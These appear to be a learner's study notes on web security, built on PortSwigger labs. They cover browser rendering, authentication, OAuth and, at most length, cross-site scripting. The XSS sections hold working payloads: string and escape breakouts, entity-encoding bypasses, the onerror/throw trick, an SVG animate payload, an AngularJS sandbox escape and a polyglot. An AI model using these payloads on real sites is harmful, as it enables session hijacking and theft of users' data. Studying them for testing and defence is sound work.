# OWASP - Open Web Application Security Project TOP-10 Vulnerabilities
Source: https://portswigger.net/web-security/learning-path

| Term | Definition |
| --- | --- |
| Vulnerability | A vulnerability is defined as a weakness or flaw in the design, implementation or behaviours of a system or application. |
| Exploit | An exploit is something such as an action or behaviour that utilises a vulnerability on a system or application. |
| Proof of Concept (PoC) | A PoC is a technique or tool (script/executable) that often demonstrates the exploitation of a vulnerability. |

## Browser Rendering Basics

A browser engine, also known as a rendering or layout engine, is the core component of a web browser responsible for transforming HTML, CSS, and other web resources into a visual representation on the screen.
The Critical Rendering Path is the sequence of steps the browser goes through to convert the HTML, CSS, and JavaScript into pixels on the screen. Optimizing the critical render path improves render performance. The critical rendering path includes the Document Object Model (DOM), CSS Object Model (CSSOM), render tree and layout.
The document object model is created as the HTML is parsed. The HTML may request JavaScript, which may, in turn, alter the DOM. The HTML includes or makes requests for styles, which in turn builds the CSS object model. The browser engine combines the two to create the Render Tree. Layout determines the size and location of everything on the page. Once layout is determined, pixels are painted to the screen.

### Retrieving Web Content

- When you enter a URL or click a link, the browser sends a request to the web server. The server responds and the browser engine receives the HTML, CSS, JavaScript, and other files from the server.
- JavaScript execution: JavaScript code is executed, which can dynamically manipulate the DOM and CSS, updating the page's content and appearance. *JavaScript parsing is done during compile time or whenever the parser is invoked, such as during a call to a method/function.*
- Security and navigation: Browser engines also enforce security policies, handle navigation through hyperlinks, and manage data submitted through forms.

### Building the DOM

The HTML is parsed into a Document Object Model (DOM) tree, which represents the structure of the web page.
The first step is processing the HTML markup and building the DOM tree. HTML parsing involves tokenization and tree construction. HTML tokens include start and end tags, as well as attribute names and values. If the document is well-formed, parsing it is straightforward and faster. The parser parses tokenized input into the document, building up the document tree.
The DOM tree describes the content of the document. The `<html>` element is the first element and root node of the document tree. The tree reflects the relationships and hierarchies between different elements. Elements nested within other elements are child nodes. The greater the number of DOM nodes, the longer it takes to construct the DOM tree.
When the parser finds non-blocking resources, such as an image, the browser will request those resources and continue parsing. Parsing can continue when a CSS file is encountered, but `<script>` elements — particularly those without an async or defer attribute — block rendering (some requests are blocking, which means the parsing of the rest of the HTML is halted until the imported asset is handled) and pause the parsing of HTML. Though the browser's preload scanner hastens this process, excessive scripts can still be a significant bottleneck. Waiting to obtain CSS doesn't block HTML parsing or downloading, but it does block JavaScript because JavaScript is often used to query CSS properties' impact on elements.

### Building the CSSOM

The second step in the critical rendering path is processing CSS and building the CSSOM tree. The CSS object model is similar to the DOM. The DOM and CSSOM are both trees. They are independent data structures. The browser converts the CSS rules into a map of styles it can understand and work with. The browser goes through each rule set in the CSS, creating a tree of nodes with parent, child, and sibling relationships based on the CSS selectors.
As with HTML, the browser needs to convert the received CSS rules into something it can work with. Hence, it repeats the HTML-to-object process, but for the CSS.
The CSSOM tree includes styles from the user agent style sheet. The browser begins with the most general rule applicable to a node and recursively refines the computed styles by applying more specific rules. In other words, it cascades the property values. Building the CSSOM is very, very fast, and this build time information is not displayed in the developer tools. Rather, the "Recalculate Style" in developer tools shows the total time it takes to parse CSS, construct the CSSOM tree, and recursively calculate computed styles. In terms of web performance, there are many better ways to invest optimization effort, as the total time to create the CSSOM is generally less than the time it takes for one DNS lookup.
The browser then creates a render tree from both these structures to be able to paint the content to the screen. JavaScript is also downloaded, parsed, and then executed.

### Layout and Rendering

The browser engine calculates the layout of the page based on the DOM and CSS, then renders the page by drawing the elements on the screen. Rendering steps include style, layout, paint, and in some cases compositing. The CSSOM and DOM trees created in the parsing step are combined into a render tree which is then used to compute the layout of every visible element, which is then painted to the screen.
- The third step is computed style tree, or render tree, construction. It starts with the root of the DOM tree, traversing each visible node. Each visible node has its CSSOM rules applied to it. The render tree holds all the visible nodes with content and computed styles, matching up all the relevant styles to every visible node in the DOM tree, and determining, based on the CSS cascade, what the computed styles are for each node.
- The fourth step in the critical rendering path is running layout on the render tree to compute the geometry of each node. Layout is the process by which the dimensions and location of all the nodes in the render tree are determined, plus the determination of the size and position of each object on the page. Reflow is any subsequent size and position determination of any part of the page or the entire document. The first time the size and position of each node is determined is called layout. Subsequent recalculations are called reflows.
- In the painting or rasterization phase, the browser converts each box calculated in the layout phase to actual pixels on the screen. Painting involves drawing every visual part of an element to the screen, including text, colors, borders, shadows, and replaced elements like buttons and images.
- When sections of the document are drawn in different layers, overlapping each other, compositing is necessary to ensure they are drawn to the screen in the right order and the content is rendered correctly.
As the page continues to load assets, reflows can happen (recall our example image that arrived late). A reflow sparks a repaint and a re-composite.

## Authentication Vulnerabilities

- Authentication is the verification of who you are.
- Single-factor authentication refers to when only one form of authentication is used. For example, when you log in to a webpage using only a username and password and are granted access, that is single-factor authentication.
- Multi-factor authentication (MFA) is the use of multiple types of authentication in order to access a single resource.
- An API is the part of a server that sends and receives data. There are 3 main types of API authentication:
  - HTTP Basic Auth - such as cookies that store your session credentials (https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/).

Broadly speaking, most vulnerabilities in authentication mechanisms arise in one of two ways:
- The authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.
- Logic flaws or poor coding in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. This is sometimes referred to as "broken authentication".

API keys - API keys are similar to HTTP Basic Auth except, instead of a username and password, you use something called an API token. An API token is a unique string of letters and numbers generated for each user.

### OAuth

OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user's account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application. This means users can fine-tune which data they want to share rather than having to hand over full control of their account to a third party.
OAuth 2.0 was originally developed as a way of sharing access to specific data between applications. It works by defining a series of interactions between three distinct parties, namely a client application, a resource owner, and the OAuth service provider.

- Client application - The website or web application that wants to access the user's data.
- Resource owner - The user whose data the client application wants to access.
- OAuth service provider - The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.

There are numerous different ways that the actual OAuth process can be implemented. These are known as OAuth "flows" or "grant types" https://portswigger.net/web-security/oauth/grant-types The OAuth grant type determines the exact sequence of steps that are involved in the OAuth process. The grant type also affects how the client application communicates with the OAuth service at each stage, including how the access token itself is sent. For this reason, grant types are often referred to as "OAuth flows". An OAuth service must be configured to support a particular grant type before a client application can initiate the corresponding flow. The client application specifies which grant type it wants to use in the initial authorization request it sends to the OAuth service.

In any OAuth flow, the user must approve the requested access based on the scope defined in the authorization request. The resulting token allows the client application to access only the scope that was approved by the user. But in some cases, it may be possible for an attacker to "upgrade" an access token (either stolen or obtained using a malicious client application) with extra permissions due to flawed validation by the OAuth service. The process for doing this depends on the grant type.

“The client application requests access to a subset of the user's data, specifying which grant type they want to use and what kind of access they want. The user is prompted to log in to the OAuth service and explicitly give their consent for the requested access. The client application receives a unique access token (The access token that it received from the authorization server is often used instead of a traditional password.) that proves they have permission from the user to access the requested data. Exactly how this happens varies significantly depending on the grant type. The client application uses this access token to make API calls fetching the relevant data from the resource server.”

“OpenID” Connect slots neatly into the normal OAuth flows. From the client application's perspective, the key difference is that there is an additional, standardized set of scopes that are the same for all providers, and an extra response type: id_token.

### Authorization

Authorization is the verification of what you have the right to do.
Role-based access control is exactly what it sounds like: you have permissions to access certain things (authorization) based on your role/responsibilities (authentication). In an enterprise environment, role-based access is usually controlled through a system of users and roles. Each user is placed in a role and given access to all of the systems that come with that role. By ensuring that each user has only the access necessary for their role, systems become more secure while streamlining operational efficiency.

## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a common web application vulnerability that occurs when a web application returns unsanitized input to the front end of an application. In a XSS attack, an attacker takes advantage of this vulnerability by inputting malicious code, generally in the form of JavaScript, through the browser. This can lead to the attacker stealing information from a user, redirecting users to malicious pages, or taking control of their browser.
The three categories of XSS attacks differ in how the payload is stored and executed:
- Stored/Persistent XSS
- Reflected XSS
- DOM-Based XSS
- XSS cheat sheet

Content security policy (CSP) is a browser mechanism that aims to mitigate the impact of cross-site scripting and some other vulnerabilities. If an application that employs CSP contains XSS-like behavior, then the CSP might hinder or prevent exploitation of the vulnerability. Often, the CSP can be circumvented to enable exploitation of the underlying vulnerability.

### Stored, Reflected, and DOM XSS (Reference)
A.) Stored XSS - Second Order Server-Side XSS. The most dangerous type of XSS. Often referred to as Persistent XSS where the malicious script comes from the website's database.  This arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the DATABASE. The data in question might be submitted to the application via HTTP requests; for example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order. In other cases, the data might arrive from other untrusted sources; for example, a webmail application displaying messages received over SMTP, a marketing application displaying social media posts, or a network monitoring application displaying packet data from network traffic. 
As an Example,  A message board application lets users submit messages, which are displayed to other users: <p>Hello, this is my message!</p>  The application doesn't perform any other processing of the data, so an attacker can easily send a message that attacks other users:
<p><script>/* Bad stuff here... */</script></p> The dangerous data is subsequently read back into the application and included in dynamic content. Stored XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker’s perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.
A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. 

The first step in testing for stored XSS vulnerabilities is to locate the links between entry and exit points, whereby data submitted to an entry point is emitted from an exit point. The reasons why this can be challenging are that:
Data submitted to any entry point could in principle be emitted from any exit point. For example, user-supplied display names could appear within an obscure audit log that is only visible to some application users. Data that is currently stored by the application is often vulnerable to being overwritten due to other actions performed within the application. For example, a search function might display a list of recent searches, which are quickly replaced as users perform other searches.
To comprehensively identify links between entry and exit points would involve testing each permutation separately, submitting a specific value into the entry point, navigating directly to the exit point, and determining whether the value appears there


Submit random alphanumeric values. For each entry point, submit a unique random value and determine whether the value is reflected in the response. 
1. Determine the reflection context. For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.
2. Test a candidate payload. Based on the context of the reflection, test an initial candidate XSS payload that will trigger JavaScript execution if it is reflected unmodified within the response. The easiest way to test payloads is to send the request to Burp Repeater, modify the request to insert the candidate payload, issue the request, and then review the response to see if the payload worked.
3. Test alternative payloads. If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context of the reflection and the type of input validation that is being performed. For more details, see cross-site scripting contexts
4. Test the attack in a browser. Finally, if you succeed in finding a payload that appears to work within Burp Repeater, transfer the attack to a real browser (by pasting the URL into the address bar, or by modifying the request in Burp Proxy's intercept view, and see if the injected JavaScript is indeed executed. Often, it is best to execute some simple JavaScript like alert(document.domain) which will trigger a visible popup within the browser if the attack succeeds.



B.) Reflected XSS - First Order Server-Side XSS. This happens when user-supplied data malicious script comes from the current HTTP request. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 
As an example, https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script> Unsanitization results to this output <p>Status: <script>/* Bad stuff here. */</script></p>
data is read directly from the HTTP request and reflected back in the HTTP response. If the Target user visits the URL constructed by the attacker, then the attacker's script executes in the user's browser, in the context of that user's session with the application. At that point, the script can carry out any action, and retrieve any data, to which the user has access. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker’s content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user’s machine to the attacker or perform other nefarious activities.
This attack is mounted when a user posts a malicious script to a forum so when another user clicks the link, an asynchronous HTTP Trace call is triggered which collects the user’s cookie information from the server, and then sends it over to another malicious server that collects the cookie information so the attacker can mount a session hijack attack. This is easily mitigated by removing support for HTTP TRACE on all web servers.

Testing for reflected XSS vulnerabilities manually involves the following steps:
Test every entry point - Test separately every entry point for data within the application's HTTP requests. This includes parameters or other data within the URL query string and message body, and the URL file path. 
1. Entry points into the application's processing include:
2. Parameters or other data within the URL query string and message body.
3. The URL file path.
4. HTTP request headers that might not be exploitable in relation to reflected XSS.
5. Any out-of-band routes via which an attacker can deliver data into the application. The routes that exist depend entirely on the functionality implemented by the application
The exit points for stored XSS attacks are all possible HTTP responses that are returned to any kind of application user in any situation.

When testing for reflected and stored XSS, a key task is to identify the XSS context:
The location within the response where attacker-controllable data appears.
Any input validation or other processing that is being performed on that data by the application.
Based on these details, you can then select one or more candidate XSS payloads, and test whether they are effective

What is the difference between reflected XSS and stored XSS? Reflected XSS arises when an application takes some input from an HTTP request and embeds that input into the immediate response in an unsafe way. With stored XSS, the application instead stores the input and embeds it into a later response in an unsafe way. In terms of exploitability, the key difference between reflected and stored XSS is that a stored XSS vulnerability enables attacks that are self-contained within the application itself. The attacker does not need to find an external way of inducing other users to make a particular request containing their exploit. Rather, the attacker places their exploit into the application itself and simply waits for users to encounter it
What is the difference between reflected XSS and self-XSS? Self-XSS involves similar application behavior to regular reflected XSS, however it cannot be triggered in normal ways via a crafted URL or a cross-domain request. Instead, the vulnerability is only triggered if the victim themselves submits the XSS payload from their browser. Delivering a self-XSS attack normally involves socially engineering the victim to paste some attacker-supplied input into their browser. As such, it is normally considered to be a lame, low-impact issue.

1.	An Access Key is a Keyboard Shortcut for clicking on certain elements, not all browsers support access key, Access Keys can be added as attributes to a hidden element such Canonical links in HEAD tags. For example you might have a link element with a rel attribute on canonical, if you inject the accesskey attribute with an onclick event then you have XSS. The access key is triggered with the Keyboard Shortcut so might only work on certain browsers && operating systems. 
<link rel="canonical" accesskey="X" onclick="alert(1)" />
Poc using link elements (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) To activate AccessKey event handler

2.	XSS into JavaScript -> When the XSS context is some existing JavaScript within the response, a wide variety of situations can arise, with different techniques necessary to perform a successful exploit. 
In the simplest case, it is possible to simply Terminate the existing script by closing the script tag that is enclosing the existing 	JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:
<script>
...
var input = 'controllable data here';
...
</script>
then you can use the following payload to break out of the existing JavaScript and execute your own:
The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The above payload leaves the original script broken, with an un-Terminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way. 

3.	Breaking out of a JavaScript string -> In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing. Some useful ways of breaking out of a string literal are:
'-alert(document.domain)-'   &&   ‘;alert(document.domain)//

4.	Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. In this situation, applications often make the mistake of failing to escape the backslash character itself. This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application. Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the single quote ‘ is now interpreted as a string terminator, and so the attack succeeds.
For example, suppose that the input: ';alert(document.domain)// gets converted to:  \';alert(document.domain)//
You can now use the alternative payload: \';alert(document.domain)// which gets converted to: \\';alert(document.domain)//

5.	Making use of HTML-encoding -> When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.
When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further. If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit, you can often bypass the input validation by HTML-encoding those characters.
For example, if the XSS context is as follows:  <a href="#" onclick="... var input='controllable data here'; ...">
and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:  &apos;-alert(document.domain)-&apos;
The &apos; sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.  

6.	A few years ago I discovered a technique to call functions in JavaScript without parentheses using onerror and the throw statement. It works by setting the onerror handler to the function you want to call and the throw statement is used to pass the argument to the function: Some websites make XSS more difficult by restricting which characters you are allowed to use. This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website. In these situations, you need to experiment with other ways of calling functions which bypass these security measures. One way of doing this is to use the throw statement with an exception handler. This enables you to pass arguments to a function without using parentheses. The following code assigns the alert() function to the global exception handler and the throw statement passes the 1 to the exception handler (in this case alert). The end result is that the alert() function is called with 1337 as an argument.
	<script>onerror=alert;throw 1337</script>

The onerror handler is called every time a JavaScript exception is created, and the throw statement allows you to create a custom exception containing an expression which is sent to the onerror handler. Because throw is a statement, you usually need to follow the onerror assignment with a semi-colon in order to begin a new statement and not form an expression.
I encountered a site that was filtering parentheses and semi-colons, and I thought it must be possible to adapt this technique to execute a function without a semi-colon. The first way is pretty straightforward: you can use curly braces to form a block statement in which you have your onerror assignment. After the block statement you can use throw without a semi-colon (or new line):
<script>{onerror=alert}throw 1337</script>

The block statement was good but I wanted a cooler alternative. Interestingly, because the throw statement accepts an expression, you can do the onerror assignment inside the throw statement and because the last part of the expression is sent to the onerror handler the function will be called with the chosen arguments. Here's how it works:
Example of using the throw statement with an expression
<script>throw onerror=alert,'some string',123,'haha'</script>
￼
If you've tried running the code you'll notice that Chrome prefixes the string sent to the exception handler with "Uncaught".
Removed toString Here’s a revised version of the proof of concept that avoids using toString and directly referencing window -> Replaced with valueOf, another method that JavaScript objects use for type conversion. When JavaScript expects a primitive value, valueOf is called before toString. 

https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&'},
x=x=>{throw/**/onerror=alert,1337},
valueOf=x,[]+'',
{x:'
VERSUS
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&'},
x=x=>{throw/**/onerror=alert,1337},
toString=x,window+'',
{x:'

7.	This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked. 
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
SVG stands for Scalable Vector Graphics. It's an XML-based markup language for describing two-dimensional based vector graphics. SVG is used to define graphics for the Web. The <svg> tag is the container for SVG graphics. In the provided script, several SVG-specific elements are used:
<a>: This element is used within SVG just like in HTML to define a hyperlink.
<animate>: This element is used to animate an attribute or a set of attributes over time.
<text>: This element is used to define text in the SVG.

	Attributes provide additional information about elements. Here are key attributes used in your script:
attributeName-> Specifies the name of the CSS property or attribute of the target element that is going to be changed during the animation.
values->Defines the values the attributeName will take over the course of the animation.
x and y -> These attributes on the <text> element specify the position of the text in the SVG canvas.
How the Exploit Works-> The exploit involves using the <animate> element to dynamically change an attribute value — in this case, the href attribute of the <a> element. By setting the attributeName to "href" and using values to change its content to javascript:alert(1), you create a scenario where interacting with the link triggers JavaScript execution.

	Steps in the Exploit
Animation Trigger: The <animate> element begins as soon as the SVG is rendered because no specific start time is defined.
Attribute Manipulation: The href attribute of the parent <a> element is set to execute JavaScript (javascript:alert(1)), instead of navigating to a URL.
User Interaction: When a user clicks on the text "Click me", which is nested inside the <a> element, the browser attempts to navigate to the href of the <a> element.
JavaScript Execution: Instead of navigating, the browser executes the JavaScript code specified (alert(1)), popping up an alert box.

	Explanation of the Code
x=x=>{throw/**/onerror=alert,1337}: This function x is assigned an arrow function that throws an error. The comment /**/ is used to bypass certain syntax constraints or filters.
onerror=alert: Assigns the global error handler to alert, so any uncaught errors will trigger an alert box.
1337: This is the value thrown by the error, intended to be caught by the onerror event handler, potentially showing an alert with this number.
valueOf=x,[]+'': This triggers the valueOf function when JavaScript attempts to convert an object to a primitive type, here manipulated to trigger our payload.
By using []+'', which simplifies to converting an empty array to a string, we indirectly force a type conversion without explicitly calling window.toString(). This results in a string representation, which in some contexts can be manipulated or exploited similarly as with window.

8.	XSS in JavaScript template literals -> JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax.
For example, the following script will print a welcome message that includes the user's display name:

When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${...} syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows: 

then you can use the following payload to execute JavaScript without terminating the template literal: ${alert(document.domain)}

C. DOM-Based XSS - First Order Client-Side XSS. DOM stands for Document Object Model DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post. DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts. 
To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.
The most common source for DOM XSS is the URL, which is typically accessed with the window.location object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. In certain circumstances, such as when targeting a 404 page or a website running PHP, the payload can also be placed in the path.

How to test for DOM-based cross-site scripting - Testing HTML sinks
1. To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as location.search), then use developer tools to inspect the HTML and find where your string appears. Recall some sinks - document.write function is populated with data from source - location.search which you can control using the website URL.  In Chrome's developer tools, you can use Control+F (or Command+F on MacOS) to search the DOM for your string. For each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your input to see how it is processed. For example, if your string appears within a double-quoted attribute then try to inject double quotes in your string to see if you can break out of the attribute.
Note that browsers behave differently with regards to URL-encoding, Chrome, Firefox, and Safari will URL-encode location.search and location.hash, while IE11 and Microsoft Edge (pre-Chromium) will not URL-encode these sources. If your data gets URL-encoded before being processed, then an XSS attack is unlikely to work.
2. Testing JavaScript execution sinks for DOM-based XSS is a little harder. With these sinks, your input doesn't necessarily appear anywhere within the DOM, so you can't search for it. Instead you'll need to use the JavaScript debugger to determine whether and how your input is sent to a sink. For each potential source, such as location, you first need to find cases within the page's JavaScript code where the source is being referenced. In Chrome's developer tools, you can use Control+Shift+F (or Command+Alt+F on MacOS) to search all the page's JavaScript code for the source.Once you've found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source's value is used. You might find that the source gets assigned to other variables. If this is the case, you'll need to use the search function again to track these variables and see if they're passed to a sink. When you find a sink that is being assigned data that originated from the source, you can use the debugger to inspect the value by hovering over the variable to show its value before it is sent to the sink. Then, as with HTML sinks, you need to refine your input to see if you can deliver a successful XSS attack.
3. Testing for DOM XSS using DOM Invader
Identifying and exploiting DOM XSS in the wild can be a tedious process, often requiring you to manually trawl through complex, minified JavaScript. If you use Burp's browser, however, you can take advantage of its built-in DOM Invader extension, which does a lot of the hard work for you.

In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine what techniques are necessary. Additionally, the website's scripts might perform validation or other processing of data that must be accommodated when attempting to exploit a vulnerability. 
Which sinks can lead to DOM-XSS vulnerabilities?
The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
document.write() document.writeln() document.domain element.innerHTML element.outerHTML
element.insertAdjacentHTML element.onevent

Modern web applications are typically built using a number of third-party libraries and frameworks, which often provide additional functions and capabilities for developers. It's important to remember that some of these are also potential sources and sinks for DOM XSS.
The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
add() after() append() animate() insertAfter() insertBefore() before() html() prepend() replaceAll()
replaceWith() wrap() wrapInner() wrapAll() has() constructor() init() index() jQuery.parseHTML()
$.parseHTML()

### DOM XSS in jQuery

If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery's attr() function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the attr() function, then it may be possible to manipulate the value sent to cause XSS. For example, here we have some JavaScript that changes an anchor element's href attribute using data from the URL:

$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
You can exploit this by modifying the URL so that the location.search source contains a malicious JavaScript URL. After the page's JavaScript applies this malicious URL to the back link's href, clicking on the back link will execute it: ?returnUrl=javascript:alert(document.domain)

Another potential sink to look out for is jQuery's $() selector function, which can be used to inject malicious objects into the DOM.
jQuery used to be extremely popular, and a classic DOM XSS vulnerability was caused by websites using this selector in conjunction with the location.hash source for animations or auto-scrolling to a particular element on the page. This behavior was often implemented using a vulnerable hashchange event handler, similar to the following:

$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
As the hash is user controllable, an attacker could use this to inject an XSS vector into the $() selector sink. More recent versions of jQuery have patched this particular vulnerability by preventing you from injecting HTML into a selector when the input begins with a hash character (#). However, you may still find vulnerable code in the wild.

To actually exploit this classic vulnerability, you'll need to find a way to trigger a hashchange event without user interaction. One of the simplest ways of doing this is to deliver your exploit via an iframe:
In this example, the src attribute points to the vulnerable page with an empty hash value. When the iframe is loaded, an XSS vector is appended to the hash, causing the hashchange event to fire.

### DOM XSS in AngularJS
AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded. If a framework like AngularJS is used, it may be possible to execute JavaScript without angle brackets or events. In this case, AngularJS will execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes. I.e {{ $on.constructor('alert(1)')() }} bypasses AngularJS security feature against XSS, if we tried {{ Function (‘alert(1)’)() }} it won’t work/. The constructor data property of an Object instance returns a reference to the constructor function that created the instance object. Note that the value of this property is a reference to the FUNCTION itself, not a string containing the function's name.
Note: This .constructor is a property of JavaScript objects. Not The Constructor() method which is a special method of a Function / Class for creating and initializing an object instance of that Function/class.


### Reflected DOM XSS && Stored DOM XSS
In a reflected DOM XSS vulnerability, the server processes data from the request, and echoes the data into the response. The reflected data might be placed into a JavaScript string literal, or a data item within the DOM, such as a form field. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink. Websites may also store data on the server and reflect it elsewhere. In a stored DOM XSS vulnerability, the server receives data from one request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes the data in an unsafe way.


The eval() function eval() is a function property/method of the global object, it evaluates JavaScript code represented as a string and returns its completion value. The source is parsed as a script. eval(' var data = "reflected string" '); 
The argument of the eval() function is a string. A string representing a JavaScript expression, statement, or sequence of statements. The expression can include variables and properties of existing objects. It will evaluate the source string as a script body, which means both statements and expressions are allowed. 
The Return value - The completion value of evaluating the given code. If the completion value is empty, undefined is returned. If script is not a string primitive, eval() returns the argument unchanged. For expressions, it's the value the expression evaluates to.
Warning: Executing JavaScript from a string is an enormous security risk. It is far too easy for a bad actor to run arbitrary code when you use eval(). See Never use direct eval()!, below.
The Function() constructor is very similar to the indirect eval example above: it also evaluates the JavaScript source passed to it in the global scope without reading or mutating any local bindings, and therefore allows engines to do more optimizations than direct eval().
There are two modes of eval() calls: direct eval and indirect eval. Direct eval, as the name implies, refers to directly calling the global eval function with eval(...). Everything else, including invoking it via an aliased variable, via a member access or other expression, or through the optional chaining ?. operator, is indirect.
The difference between eval() and Function() is that the source string passed to Function() is parsed as a function body, not as a script. There are a few nuances — for example, you can use return statements at the top level of a function body, but not in a script.
Explanation - Here’s how the exploitative script could look:
// URL: http://example.com/?userInput=alert('Exploited!')

// Simulated vulnerable JavaScript code on the webpage
function executeUserInput() {
    var userInput = new URLSearchParams(window.location.search).get('userInput');
    
    // Dangerous use of eval to execute user input
    eval(userInput);
} window.onload = executeUserInput;

URL Parameter: The attacker modifies the userInput parameter in the URL to include an alert() function.
Function executeUserInput(): This function retrieves the userInput parameter from the URL and executes it using eval().
Use of eval(): The eval() function evaluates or executes the argument passed to it. In this case, it executes the JavaScript code provided in the URL parameter, leading to the execution of the alert() function.

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. In this situation, applications often make the mistake of failing to escape the backslash character itself. This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application. For example, suppose that the input:
';alert(document.domain)// gets converted to \';alert(document.domain)//
You can now use the alternative payload: 
\';alert(document.domain)// gets converted to: \\';alert(document.domain)//
Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds.
 
Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.
Suppose an application embeds attacker-controllable data into its responses in an unsafe way:
<input type="text" name="input" value="CONTROLLABLE DATA HERE
Suppose also that the application does not filter or escape the > or " characters. An attacker can use the following syntax to break out of the quoted attribute value and the enclosing tag, and return to an HTML context:
">

In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:
This payload creates an img tag and defines the start of a src attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the src attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.
